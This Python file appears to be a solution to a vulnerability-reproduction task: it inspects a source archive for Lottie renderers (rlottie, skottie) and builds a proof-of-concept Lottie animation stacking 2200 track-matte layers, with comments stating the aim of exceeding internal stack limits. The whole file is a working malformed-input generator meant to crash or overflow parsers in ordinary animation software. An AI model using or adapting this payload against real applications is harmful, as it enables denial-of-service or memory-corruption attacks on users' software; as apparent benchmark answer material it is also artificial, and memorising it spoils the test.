import json
import tarfile
from typing import Optional


class Solution:
    def _detect_project(self, src_path: str) -> Optional[str]:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = [m.name.lower() for m in tf.getmembers() if m.isfile() or m.isdir()]
        except Exception:
            return None

        joined = " ".join(names)
        if "rlottie" in joined or "/lottie" in joined or "skottie" in joined or "bodymovin" in joined:
            return "lottie"
        return None

    def _gen_lottie_ks(self):
        # Minimal transform; explicit a:0 for robustness across versions
        return {
            "o": {"a": 0, "k": 100},
            "r": {"a": 0, "k": 0},
            "p": {"a": 0, "k": [0, 0, 0]},
            "a": {"a": 0, "k": [0, 0, 0]},
            "s": {"a": 0, "k": [100, 100, 100]},
        }

    def _generate_lottie_poc(self, depth: int) -> bytes:
        # Build a Lottie composition with a very deep sequence of matte (td) layers
        # to push clip marks without pairing tt immediately.
        layers = []
        ks = self._gen_lottie_ks()

        # Generate many matte layers (td:1). Keep shapes empty to reduce size, but maintain validity.
        for i in range(depth):
            layers.append({
                "ddd": 0,
                "ind": i + 1,
                "ty": 4,             # Shape layer
                "ks": ks,
                "td": 1,             # Track matte source; pushes a clip mark
                "ip": 0,
                "op": 2,
                "st": 0,
                "bm": 0,
                "shapes": []         # No shapes; sufficient for matte handling in parsers
            })

        # Add a final consumer of matte to make the parser process the matte stack.
        layers.append({
            "ddd": 0,
            "ind": depth + 1,
            "ty": 4,
            "ks": ks,
            "tt": 1,                # Alpha matte
            "ip": 0,
            "op": 2,
            "st": 0,
            "bm": 0,
            "shapes": []
        })

        comp = {
            "v": "5.6.10",
            "fr": 30,
            "ip": 0,
            "op": 2,
            "w": 16,
            "h": 16,
            "layers": layers
        }
        return json.dumps(comp, separators=(",", ":"), ensure_ascii=False).encode("utf-8")

    def solve(self, src_path: str) -> bytes:
        project = self._detect_project(src_path)
        # Choose a depth large enough to exceed typical internal stack limits (e.g., 256/512/1024).
        # 2200 provides a balance between reliability and size.
        depth = 2200

        if project == "lottie" or project is None:
            return self._generate_lottie_poc(depth)

        # Default to Lottie PoC as a best-effort fallback if detection fails.
        return self._generate_lottie_poc(depth)